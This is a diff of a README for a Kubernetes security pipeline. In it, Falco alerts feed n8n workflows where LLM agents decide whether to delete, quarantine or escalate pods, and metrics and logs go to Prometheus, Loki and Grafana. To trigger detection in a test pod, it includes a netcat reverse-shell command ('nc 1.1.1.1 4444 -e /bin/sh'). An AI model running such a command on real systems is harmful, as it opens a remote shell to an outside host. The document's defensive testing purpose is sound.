@@ -1,163 +1,267 @@
-# k8s-ai-agent (PoC)
-AI-driven incident response automation for microservices — AI agent + n8n + Kubernetes (PoC).
+# AI-Driven Kubernetes Runtime Security System  
+### *Falco + n8n AI Agents + ROSES + RACE + Prometheus + Loki + Grafana*
 
-## Overview
-Workflow:  
-`Falco -> webhook -> n8n -> AI Agent (OpenAI) -> decision -> n8n -> Kubernetes API (action) + SIEM/log`
-
-Audience: students, SOC engineers, SMBs wanting low-cost SOAR capabilities.
-
-## Features
-- Event ingestion (Falco / kube-audit / Prometheus)  
-- AI-based decision making (OpenAI API)  
-- Orchestration via n8n (playbooks)  
-- Actions: annotate / quarantine / delete pod, alert to SIEM, escalate to human  
-- Metrics: MTTA, MTTR, False Positive Rate (FPR)
+This project implements a fully automated, **AI-augmented security and response pipeline** for Kubernetes.  
+It detects threats using **Falco**, analyzes events using **LLM-based ROSES & RACE agents**, performs autonomous remediation actions, and exports **SRE-grade metrics** into Prometheus while streaming logs into Loki for full observability.
 
 ---
 
-## Quickstart (Kind / local PoC)
+# 📌 Architecture Overview
 
-### Prerequisites
-- Docker (>= 20) and `kubectl`
-- `kind` or `minikube` (recommended: `kind`)
-- `helm`
-- Git
-- `OPENAI_API_KEY` (set as env var; **do not commit to repo**)
+Falco → Falcosidekick → n8n Webhook
+↓
+┌────────────────────────────────────────────┐
+│ n8n AI Pipeline │
+│--------------------------------------------│
+│ ROSES → JSON Parser → RACE → JSON Parser │
+│ → Decision Switch → K8s API Actions │
+│ → Pushgateway (Prometheus Metrics) │
+│ → Loki (Log Storage) │
+└────────────────────────────────────────────┘
+↓
+Grafana Dashboards
+
 
 ---
 
-### 1) Create kind cluster
+# 🚀 Quick Start
+
+## 1. Deploy the entire system
+
 ```bash
-kind create cluster --name ai-agent-poc
-kubectl cluster-info --context kind-ai-agent-poc
+./deploy.sh
 ```
 
-### 2) Install Prometheus/Grafana & Loki (optional)
-Use official Helm charts for Prometheus / Grafana / Loki if you want metrics/logs and dashboards.
-This step is optional for the minimal PoC.
+This script installs:
+- KIND Kubernetes cluster
+- Falco + Falcosidekick UI
+- n8n with NodePort
+- RBAC + ServiceAccount token
+- Loki + Promtail + Grafana
+- Prometheus + Pushgateway
+- Quarantine NetworkPolicy
+- Playground test pods
 
-### 3) Install Falco (via Helm)
-``` bash
-helm repo add falcosecurity https://falcosecurity.github.io/charts
-helm repo update
-helm install falco falcosecurity/falco --namespace falco --create-namespace
+# 🌐 Access URLs
+
+After installation:
+```nginx
+Falco UI:         http://localhost:32040
+n8n UI:           http://localhost:30008
+Grafana:          http://localhost:30300
+Prometheus:       http://localhost:30900
+Pushgateway:      http://localhost:30123
 ```
 
-### 4) Deploy n8n
-Option A — Helm in cluster:
+The script prints the n8n Kubernetes API token automatically.
+
+# 
+## 1. Webhook (Falco → n8n)
+Receives JSON Falco alert.
+
+## 2. ROSES AI Agent
+
+- Analyzes event using ROSES framework:
+- ROLE
+- OBJECTIVE
+- STEPS
+- EVIDENCE
+- SUMMARY
+
+## 3. ROSES JSON Parser
+
+Extracts valid JSON using regex:
+```javascript
+const raw = $input.first().json.output;
+const jsonMatch = raw.match(/\{(?:[^{}]|(?:\{[^{}]*\}))*\}/);
+return [{ json: JSON.parse(jsonMatch[0]) }];
+```
+
+## 4. RACE AI Agent
+
+Makes final decision:
+- delete_pod
+- quarantine_pod
+- ignore
+- escalate
+
+## 5. RACE Parser (same logic as ROSES parser)
+## 6. Build Prometheus Metrics
+```javascript
+return [{
+  json: {
+    mtta: 4.2,
+    mttr: 4.2,
+    classification: "true_positive",
+    decision: "delete_pod"
+  }
+}];
+```
+
+## 7. Pushgateway HTTP Request
 ```bash
-kubectl create ns automation
-helm repo add n8n https://n8n-io.github.io/n8n-helm/
-helm repo update
-helm install n8n n8n/n8n --namespace automation
-```
-Option B — run n8n locally (docker-compose):
-Recommended for faster development. Then use local webhook instead of cluster ingress.
+POST /metrics/job/incident-pipeline
+Content-Type: text/plain
 
-### 5) Build AI-Agent image (locally)
+incident_pipeline_mtta_seconds 4.2
+incident_pipeline_mttr_seconds 4.2
+incident_pipeline_incident_total{classification="true_positive"} 1
+incident_pipeline_decision_total{decision="delete_pod"} 1
+incident_pipeline_events_total 1
+```
+
+## 8. Switch Node → Kubernetes API
+
+Decision logic:
+
+delete_pod → kubectl delete pod
+quarantine_pod → patch label + apply NetworkPolicy
+escalate → external webhook / Slack
+ignore → do nothing
+
+# 🧪 Test Playground Pods
+
+The script deploys:
 ```bash
-# from repo root
-docker build -t k8s-ai-agent:latest ./agent
-
-# for kind
-kind load docker-image k8s-ai-agent:latest --name ai-agent-poc
+kubectl apply -f manifests/playground/pod-delete.yaml
+kubectl apply -f manifests/playground/pod-quarantine.yaml
+kubectl apply -f manifests/playground/escalate-test.yaml
+kubectl apply -f manifests/playground/test-shell.yaml
 ```
 
-### 6) Deploy AI-Agent
-Create namespace:
+Trigger Falco by running commands inside the pod, e.g.:
 ```bash
-kubectl create ns automation
+kubectl exec -n playground -it pod-delete-test -- nc 1.1.1.1 4444 -e /bin/sh
 ```
-Create secret with your OpenAI key:
+
+# 🔒 Quarantine Mode
+Patch pod:
 ```bash
-kubectl create secret generic openai-secret \
-  --from-literal=api-key="$OPENAI_API_KEY" \
-  -n automation
-```
-Apply deployment manifest:
-```bash
-kubectl apply -f deployment/agent-deployment.yaml
-kubectl -n automation get pods
-```
-Ensure agent-deployment.yaml references the correct image (local or GHCR).
-
-### 7) Configure Falco → n8n webhook
-- In n8n create a Webhook node and copy endpoint.
-- Configure Falco to send output to this webhook.
-- For local dev:
-```bash
-kubectl -n automation port-forward svc/n8n 5678:5678
-```
-Then set Falco webhook → http://localhost:5678/webhook/...
-
-### 8) Create n8n workflow
-1. Webhook trigger (Falco event)
-2. Enrich: fetch pod metadata / Prometheus metrics
-3. HTTP → AI-Agent (/analyze)
-4. Switch on decision:
-    - quarantine → patch NetworkPolicy / annotate pod
-    - delete → kubectl delete pod
-    - alert → forward to SIEM/logstore
-    - escalate → Slack/email → human
-5. Log action + store audit record
-
-### 9) Simulate safe attacks
-Use manifests from examples/:
-```bash
-kubectl apply -f examples/cpu-hog.yaml
-kubectl apply -f examples/exfil-sim.yaml
-kubectl apply -f examples/portscan-job.yaml
-```
-These are safe — only simulate resource hog / scan patterns.
-
-### 10) Metrics and evaluation
-- Measure MTTA, MTTR, FPR by comparing detected vs expected.
-- Store logs/CSV for evaluation.
-
-## Security
-- Never commit secrets (OPENAI_API_KEY, kubeconfigs).
-- Use Kubernetes Secrets / CI secrets.
-- Consider Vault / sealed-secrets.
-- Add SECURITY.md with disclosure process.
-
-## Repo structure
-```text
-k8s-ai-agent/
-├─ .github/                 # CI/CD workflows (GitHub Actions)
-│  └─ workflows/ci.yml
-├─ agent/                   # AI agent code
-│  ├─ Dockerfile
-│  ├─ app.py
-│  ├─ requirements.txt
-│  └─ deployment.yaml
-├─ n8n/                     # Exported n8n workflows
-│  └─ workflows.json
-├─ deployment/              # Kubernetes manifests
-│  ├─ agent-deployment.yaml
-│  ├─ n8n-deployment.yaml
-│  └─ falco-values.yaml
-├─ examples/                # Test workloads (safe attack simulations)
-│  ├─ cpu-hog.yaml
-│  ├─ exfil-sim.yaml
-│  └─ portscan-job.yaml
-├─ docs/                    # Docs and diagrams
-│  ├─ architecture.png
-│  └─ playbooks.md
-├─ README.md
-├─ LICENSE
-├─ SECURITY.md
-└─ .gitignore
+kubectl patch pod pod-quarantine-test \
+  -n playground \
+  -p '{"metadata":{"labels":{"security/quarantined":"true"}}}'
 ```
 
-## Troubleshooting
-Check pods:
-```bash
-kubectl top pods
-kubectl describe pod <name>
+Auto-isolation NetworkPolicy:
+```yaml
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: quarantine
+spec:
+  podSelector:
+    matchLabels:
+      security/quarantined: "true"
+  ingress: []
+  egress: []
+  policyTypes:
+  - Ingress
+  - Egress
 ```
-If Falco webhook fails → forward n8n:
-```bash
-Copy code
-kubectl -n automation port-forward svc/n8n 5678:5678
+
+# 📊 Prometheus Metrics
+## MTTA
+Mean Time To Acknowledge:
+```promql
+avg_over_time(incident_pipeline_mtta_seconds[24h])
 ```
+
+## MTTR
+Mean Time To Respond:
+```promql
+avg_over_time(incident_pipeline_mttr_seconds[24h])
+```
+
+## False Positive Rate
+```promql
+sum(incident_pipeline_incident_total{classification="false_positive"})
+/
+sum(incident_pipeline_incident_total)
+```
+
+## Decision Distribution
+```promql
+sum by(decision) (incident_pipeline_decision_total)
+```
+
+# 📝 Loki Log Storage
+
+n8n pushes structured logs:
+```json
+{
+  "decision": "delete_pod",
+  "classification": "true_positive",
+  "pod": "pod-delete-test",
+  "timestamp": "2025-12-11T06:33:14Z"
+}
+```
+
+Query in Grafana Explore:
+```logql
+{job="incident-pipeline"}
+```
+
+# 📈 Grafana Dashboards
+
+Recommended panels:
+
+## MTTA Trend
+```promql
+incident_pipeline_mtta_seconds
+```
+
+## MTTR Trend
+```promql
+incident_pipeline_mttr_seconds
+```
+
+## Decision Distribution (Pie Chart)
+```promql
+sum(incident_pipeline_decision_total) by (decision)
+```
+
+## Classification Heatmap
+```promql
+sum(incident_pipeline_incident_total) by (classification)
+```
+
+## Loki Logs Table
+```logql
+{job="incident-pipeline"}
+```
+
+# 📂 Repository Structure
+```pgsql
+├── cluster/
+│   └── kind-config.yaml
+├── deploy.sh
+├── manifests/
+│   ├── falco/
+│   ├── n8n/
+│   ├── monitoring/
+│   ├── playground/
+│   ├── policy/
+│   └── token/
+└── README.md
+```
+
+# 🛡 Security Notes
+
+- All actions use a restricted ServiceAccount
+- Only pod delete / patch allowed
+- All decisions logged
+- All metrics exported
+- Full traceability available through Loki
+
+# 🎯 Conclusion
+
+This project demonstrates a production-grade AI-driven Kubernetes security pipeline:
+✔ Real-time detection (Falco)
+✔ AI reasoning (ROSES)
+✔ AI classification (RACE)
+✔ Autonomous remediation (n8n + K8s API)
+✔ MTTA/MTTR/FPR observability (Prometheus)
+✔ Full audit logs (Loki)
+✔ Dashboards (Grafana)
+
+It is a complete, research-ready and production-ready system for AI-Powered SecOps / AIOps / Cloud Security Automation.
